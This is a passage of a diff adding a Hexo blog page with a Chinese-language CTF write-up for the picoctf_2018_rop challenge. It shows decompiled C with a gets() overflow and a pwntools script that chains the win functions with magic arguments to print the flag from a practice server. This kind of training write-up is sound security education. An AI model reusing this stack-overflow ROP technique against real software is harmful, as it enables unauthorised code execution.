+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/picoctf_2018_rop/" class="post-title-link" itemprop="url">picoctf_2018_rop</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-09-29 20:12:25" itemprop="dateCreated datePublished" datetime="2021-09-29T20:12:25+08:00">2021-09-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-07-19 10:08:21" itemprop="dateModified" datetime="2022-07-19T10:08:21+08:00">2022-07-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="picoctf-2018-rop"><a href="#picoctf-2018-rop" class="headerlink" title="picoctf_2018_rop"></a>picoctf_2018_rop</h2><p><img src="/picoctf_2018_rop/1.jpg"></p>
+<p>根据题目提示，应该使用ROP，但查看了一下文件，ret2libc应该也是可行的。</p>
+<p>重要代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__gid_t</span> v4; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v4 = getegid();</span><br><span class="line">  setresgid(v4, v4, v4);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your input&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(s);             <span class="comment">//存在溢出点，且溢出长度很长</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win_function1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  win1 = <span class="number">1</span>;     <span class="comment">//设置win1的值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">win_function2</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="type">unsigned</span> __int8)win1;</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; a1 == <span class="number">-1163220307</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    win2 = <span class="number">1</span>;      <span class="comment">//设置win2的值</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( win1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Wrong Argument. Try Again.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Nope. Try a little bit harder.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">flag</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [esp+Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">      <span class="string">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">48</span>, stream);</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; win2 &amp;&amp; a1 == <span class="number">-559039827</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; win2 )        <span class="comment">//两个值要相等，不然没法进来</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Incorrect Argument. Remember, you can call other functions in between each win function!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( win1 || win2 )        <span class="comment">//只要有一个非0即可</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Nice Try! You&#x27;re Getting There!&quot;</span>);     <span class="comment">//把程序执行到这里就可以getflag了，但不知道它是从哪里调用的</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You won&#x27;t get the flag that easy..&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据程序结构，构造payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29055</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">win_function1 = <span class="number">0x080485CB</span></span><br><span class="line">win_function2 = <span class="number">0x080485D8</span></span><br><span class="line">flag = <span class="number">0x0804862B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x1c</span></span><br><span class="line">payload += p32(win_function1)</span><br><span class="line">payload += p32(win_function2) + p32(flag) + p32(<span class="number">0xBAAAAAAD</span>) + p32(<span class="number">0xDEADBAAD</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;input&gt; &quot;</span>, payload)     <span class="comment">#0xBAAAAAADDEADBAAD</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>获取负数的十六进制的方式如下：</p>
+<img src="picoctf_2018_rop/2.jpg" style="zoom:67%;" />
+
+<p>hex(-559039827&amp;0xFFFFFFFF)</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
